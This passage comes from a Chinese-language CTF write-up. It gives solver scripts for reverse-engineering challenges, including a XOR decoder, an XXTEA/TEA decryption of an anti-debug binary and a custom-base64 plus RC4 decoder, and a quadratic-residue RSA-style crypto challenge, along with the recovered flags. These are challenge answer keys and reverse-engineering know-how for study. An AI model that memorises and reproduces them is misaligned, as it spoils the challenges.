class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>熟练嵌套列表推导式的分析，以及map，enumer的使用</p><h2 id="superguessor"><a class="markdownIt-Anchor" href="#superguessor"></a> <strong>SuperGuessor</strong></h2><p><img src="https://s2.loli.net/2024/02/24/xdS6oaGPhYT3jl7.png" alt="" / loading="lazy"></p><p><img src="https://s2.loli.net/2024/02/24/71FbVZLUIecuiYl.png" alt="" / loading="lazy"></p><p>直接写出解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"5151525f59435d5f59495a59562e261d2a371a27291728242a3825213d0f323a3c3d36332a"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="not-main"><a class="markdownIt-Anchor" href="#not-main"></a> <strong>Not main</strong></h2><p>具体的原理在官方WP，看不懂，先简单记录一下操作流程，以后深入了解原理</p><p>通过实现一个全局类让程序在main函数之前就执行类的构造函数，在main函数结束后执行类的析构函数。</p><p>nt3断点的处理逻辑是，当前程序在main函数中会执行事先放置的int3，此时如果在未调试的情况下，程序将异常交给veh处理，将一个dword_405038赋值为0. 如果是调试情况下将异常交给调试器处理，如果此时调试器处理异常则不会交给veh，则dword_405038为1.main函数接下来会对输入进行虚假的判断。在判断后进入到析构函数中</p><p>析构函数会根据先前的dword_405038即图中的is_debug变量的值判断是否除零。除零进入到veh handler的除零异常处理块中</p><p>在这里进行真正的检测。正常的xxtea加密。构造函数和析构函数可以在start-&gt;__scrt_common_main_seh-&gt;initterm((_PVFV *)&amp;dword_403140, (_PVFV *)&amp;dword_403154);</p><p>所以正向的流程是</p><pre class="line-numbers language-none"><code class="language-none">实现一个全局类，在main函数之前就执行类的构造函数main函数开始 进行tea加密main函数结束析构函数开始判断isdebug &#x3D;0 进入异常处理块进行btea加密<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以直接逆向就可以了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">btea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">/</span> n<span class="token punctuation">;</span><span class="token comment">//这里可以说是预定义值，n=2是rounds=32</span>        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>            sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token comment">//注意这里的p是从0~n-1</span>            <span class="token punctuation">&#123;</span>                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>        <span class="token comment">//这里的MX中传入的p=n-1</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        n <span class="token operator">=</span> <span class="token operator">-</span>n<span class="token punctuation">;</span>        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">/</span> n<span class="token punctuation">;</span>        sum <span class="token operator">=</span> rounds <span class="token operator">*</span> DELTA<span class="token punctuation">;</span>        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token comment">//注意这里的p是从n-1~0,和上面是反过来的</span>            <span class="token punctuation">&#123;</span>                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>    <span class="token comment">//这里的MX中传入的 p=0</span>            sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">detea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0xC6EF3720</span><span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> k0 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k1 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k2 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k3 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k3<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k1<span class="token punctuation">)</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0xCFBE0F1B</span><span class="token punctuation">,</span> <span class="token number">0x05F3083F</span><span class="token punctuation">,</span> <span class="token number">0x4220E43B</span><span class="token punctuation">,</span> <span class="token number">0x3383AFEE</span><span class="token punctuation">,</span> <span class="token number">0xFA3237CE</span><span class="token punctuation">,</span> <span class="token number">0xECADA66E</span><span class="token punctuation">,</span> <span class="token number">0xA8D47CA7</span><span class="token punctuation">,</span> <span class="token number">0xEFC51077</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">116</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">101</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//true</span>    <span class="token class-name">uint32_t</span> fk<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x65</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//fake</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token operator">-</span>n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//负号是解密</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">detea</span><span class="token punctuation">(</span>v <span class="token operator">+</span> i<span class="token punctuation">,</span> fk<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//begin&#123;not_main_is_matter!&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="goforfun待复现"><a class="markdownIt-Anchor" href="#goforfun待复现"></a> <strong>Goforfun</strong>(待复现)</h2><p>函数主体都看不明白，放着以后再看</p><p>先贴一下exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">big_int_to_byte_array</span><span class="token punctuation">(</span>big_int<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> big_int <span class="token punctuation">:</span>        ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span>big_int<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>        big_int<span class="token operator">>></span><span class="token operator">=</span><span class="token number">8</span>    <span class="token keyword">return</span> ans<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>cmpString <span class="token operator">=</span> <span class="token string">"HZ0sMJXqxHgUb2b9RNg+1xw"</span>str1 <span class="token operator">=</span> <span class="token string">"8G+cazk2jqb7w01CtoKH4FsrgR3vVmQ9pPhXLAleOd/nB6DfIxMWYiUZ5SEJyNuT"</span>cmpString <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>cmpString<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>tmp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> cmpString<span class="token punctuation">:</span>    tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>bignum <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    bignum <span class="token operator">=</span> bignum<span class="token operator">*</span><span class="token number">0x40</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token comment">#print('bignum:')</span><span class="token comment">#print((bignum))</span>bytea <span class="token operator">=</span> big_int_to_byte_array<span class="token punctuation">(</span>bignum<span class="token punctuation">)</span><span class="token comment">#print(bytea)</span><span class="token keyword">def</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    S <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment"># 初始化S盒</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment"># 生成密钥流并加解密</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> data<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">^</span> S<span class="token punctuation">[</span><span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> outkey1<span class="token operator">=</span><span class="token string">'happynewyear'</span>key1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>key1<span class="token punctuation">)</span>flag<span class="token operator">=</span>rc4_crypt<span class="token punctuation">(</span>key1<span class="token punctuation">,</span>bytea<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> <strong>Crypto</strong></h1><h2 id="我玩青水的"><a class="markdownIt-Anchor" href="#我玩青水的"></a> 我玩青水的</h2><p>题目描述</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">2</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''p = 7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161c = 5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>e=2,很自然地想到低指数加密攻击，我直接暴力枚举了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">import</span> timep <span class="token operator">=</span> <span class="token number">7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161</span>c <span class="token operator">=</span> <span class="token number">5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456</span>i <span class="token operator">=</span> <span class="token number">1000000000</span>max_attempts <span class="token operator">=</span> <span class="token number">10000000000000000</span><span class="token keyword">with</span> tqdm<span class="token punctuation">(</span>total<span class="token operator">=</span>max_attempts<span class="token punctuation">,</span> desc<span class="token operator">=</span><span class="token string">"Decrypting"</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">"iteration"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pbar<span class="token punctuation">:</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> max_attempts<span class="token punctuation">:</span>        root<span class="token punctuation">,</span> is_exact <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c <span class="token operator">+</span> i <span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> is_exact<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        pbar<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 更新进度条</span>        <span class="token comment"># time.sleep(0.01)  # 可选的睡眠，以减缓进度条更新速度</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Exceeded maximum attempts. Decryption failed."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行15分钟大概就出了</p><p>但是看了官方wp发现这是一个二次剩余问题，可以用sagemath直接秒，还是要多熟悉sagemath的语法以及函数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">from Crypto.Util.number <span class="token function">import</span> *sage: from Crypto.Util.number <span class="token function">import</span> *sage: p <span class="token operator">=</span> <span class="token number">7709388356791362098686964537734555579863438117190798798028727762878684</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">78288090432254985691234478978185461828393900262138339023022855592088420057</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">9836394161</span>sage: c <span class="token operator">=</span> <span class="token number">5573755468949553624452023926839820294500672937008992680281196534187840</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">61585184409168294656743418965724362773546950717589866231762842003743738581</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">4152733456</span>sage: R.<span class="token operator">&lt;</span>m<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>p<span class="token punctuation">))</span>sage: f <span class="token operator">=</span> <span class="token punctuation">(</span>m^2<span class="token punctuation">)</span> - csage: m0 <span class="token operator">=</span> f.roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>sage: <span class="token assign-left variable">flag</span><span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>int<span class="token punctuation">(</span>m0<span class="token punctuation">))</span>sage: print<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>b<span class="token string">'begin&#123;quadr4ticresidue_i5_s0_3asy&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="oeis2"><a class="markdownIt-Anchor" href="#oeis2"></a> OEIS2</h2><p>题目描述</p><pre class="line-numbers language-python" data-language="python"><code 